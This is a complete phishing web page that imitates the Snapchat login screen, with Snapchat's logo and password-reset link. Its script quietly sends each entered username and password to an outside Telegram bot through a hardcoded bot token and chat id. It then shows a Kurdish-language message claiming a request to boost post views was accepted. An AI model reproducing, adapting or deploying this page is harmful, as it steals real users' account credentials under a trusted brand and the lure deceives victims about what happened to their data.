<!DOCTYPE html>

<html lang="en">

<head>

  <meta charset="UTF-8">

  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <title>Login Form</title>

  <style>

    @import url('https://fonts.googleapis.com/css?family=Heebo:400,500,600,800&display=swap');

    * {

      outline: 0;

      box-sizing: border-box;

    }

    body {

      background-color: #f2f2f2;

      font-family: 'Heebo', sans-serif;

      display: flex;

      align-items: center;

      justify-content: center;

      height: 100vh;

      margin: 0;

    }

    form {

      background: white;

      padding: 20px;

      border-radius: 6px;

      width: 356px;

      text-align: center;

    }

    h1 {

      font-size: 24px;

      font-weight: 800;

      color: #16191C;

    }

    img {

      width: 40px;

      margin: 0 auto 12px;

      display: block;

    }

    .usrnm, .pass {

      text-align: left;

      margin: 15px 0;

    }

    label {

      font-size: 12px;

      font-weight: 600;

      color: #656B73;

      margin-bottom: 5px;

      display: block;

    }

    input {

      width: 100%;

      height: 44px;

      padding: 0 12px;

      background: #F7F7F7;

      border: 1px solid #F7F7F7;

      border-radius: 4px;

      font-size: 14px;

      font-weight: 500;

      transition: 0.15s;

    }

    input:focus {

      border-bottom: 1px solid #FFD301;

      box-shadow: 0 1px 0 #FFD301;

      background: #F2F2F2;

    }

    input[type="submit"] {

      background-color: #FFFC00;

      color: #16191C;

      border-radius: 45px;

      cursor: pointer;

      border: none;

      margin-top: 20px;

    }

    a {

      font-size: 12px;

      color: #656B73;

      text-decoration: none;

    }

    a:hover {

      border-bottom: 1px solid #FFD301;

    }

    #success-msg {

      display: none;

      margin-top: 20px;

      background: #e0ffe0;

      color: #2e7d32;

      padding: 10px;

      border-radius: 5px;

      font-weight: 600;

    }

  </style>

</head>

<body>

  <form id="login-form">

    <img src="https://accounts.snapchat.com/accounts/static/images/ghost/snapchat-app-icon.svg" alt="Snapchat Logo">

    <h1>Log in to Snapchat</h1>

    <div class="usrnm">

      <label for="usrnm">Username or Email</label>

      <input id="usrnm" type="text" name="username" required>

    </div>

    <div class="pass">

      <label for="pass">Password</label>

      <input id="pass" type="password" name="password" required>

      <small><a href="https://accounts.snapchat.com/accounts/password_reset_options">Forgot password?</a></small>

    </div>

    <input type="submit" value="Log In">
    <div id="success-msg">داواکاری زیادکردن بینەری پۆست بەرزکرایەوە لەماوەی ٢٤کاژمێر زیاددەکرێت</div>
  </form>

  <script>

    const form = document.getElementById('login-form');

    const successMsg = document.getElementById('success-msg');

    form.addEventListener('submit', function (e) {

      e.preventDefault();

      const username = form.username.value;

      const password = form.password.value;

      const token = "7894584277:AAHgT2bfauGCCY2KAsTwGyzTv3iwBxD4cs4";

      const chat_id = "5834986278";

      const message = `Login snapchat🫡:\nUsername: ${username}\nPassword: ${password}`;

      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {

        method: "POST",

        headers: { "Content-Type": "application/json" },

        body: JSON.stringify({ chat_id: chat_id, text: message })

      })

      .then(response => {

        if (response.ok) {

          successMsg.style.display = 'block';

          form.reset();

        } else {

          alert("هەڵەیەک ڕوویدا لە ناردنی زانیاری");

        }

      })

      .catch(error => {

        console.error("Error:", error);

        alert("ناتوانرێت نێردرا بۆ بۆت.");

      });

    });

  </script>

</body>

</html>
